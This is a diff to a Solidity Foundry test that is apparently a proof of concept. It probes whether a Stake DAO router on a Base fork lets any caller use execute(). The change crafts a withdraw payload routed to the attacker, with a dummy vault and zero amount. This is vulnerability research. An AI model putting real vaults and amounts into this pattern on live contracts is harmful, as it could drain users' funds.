@@ -9,7 +9,8 @@ interface IRouter {
 }
 
 contract StakeDAOPoC is Test {
-    IRouter constant router = IRouter(0xfd1A2A8127A929a7B490ff6b50f70d73946f4a1F);
+    // The OFFICIAL Stake DAO Router on Base
+    IRouter constant router = IRouter(0x0f542fA75c871EB1b93Ef881b73e46acF733392f);
 
     function setUp() public {
         vm.createSelectFork(vm.envString("BASE_FORK_URL"));
@@ -21,34 +22,37 @@ contract StakeDAOPoC is Test {
         
         console.log("Router Owner:", owner);
         console.log("Attacker:", attacker);
-        
-        // Ensure the attacker is not the owner
         require(attacker != owner, "Attacker is owner");
 
-        // Craft a dummy payload. The first byte is the Module ID.
-        // We use 0x01 as a placeholder; the test only cares about the access control on execute itself.
-        bytes memory dummyCall = abi.encodePacked(
-            bytes1(uint8(1)), 
-            abi.encodeWithSignature("someFunction()")
+        // Module ID 0x01 = RouterModuleWithdraw
+        // Payload: [0x01] + [withdraw(address,uint256,address)]
+        // We use dummy arguments (address(1), 0, attacker) for the PoC.
+        bytes memory payload = abi.encodePacked(
+            bytes1(uint8(1)), // Module ID 0x01
+            abi.encodeWithSignature(
+                "withdraw(address,uint256,address)", 
+                address(1), // dummy vault address
+                0,          // dummy amount
+                attacker    // receiver
+            )
         );
         
         bytes[] memory calls = new bytes[](1);
-        calls[0] = dummyCall;
+        calls[0] = payload;
 
         vm.prank(attacker);
         
         try router.execute(calls) {
-            console.log("SUCCESS: execute() is PERMISSIONLESS. Access control is missing.");
+            console.log("SUCCESS: execute() is PERMISSIONLESS.");
         } catch Error(string memory reason) {
             console.log("Reverted with reason:", reason);
             if (keccak256(bytes(reason)) == keccak256(bytes("OwnableUnauthorizedAccount"))) {
                 console.log("SAFE: Access control is present.");
             } else {
-                console.log("VULNERABLE: Reverted, but NOT due to an ownership check.");
+                console.log("VULNERABLE: Reverted, but NOT due to ownership.");
             }
         } catch (bytes memory) {
-            console.log("Reverted with a custom error/silent revert.");
-            console.log("If this is not an ownership check, the execute function is exposed.");
+            console.log("Reverted with custom error (Potential vulnerability).");
         }
     }
 }
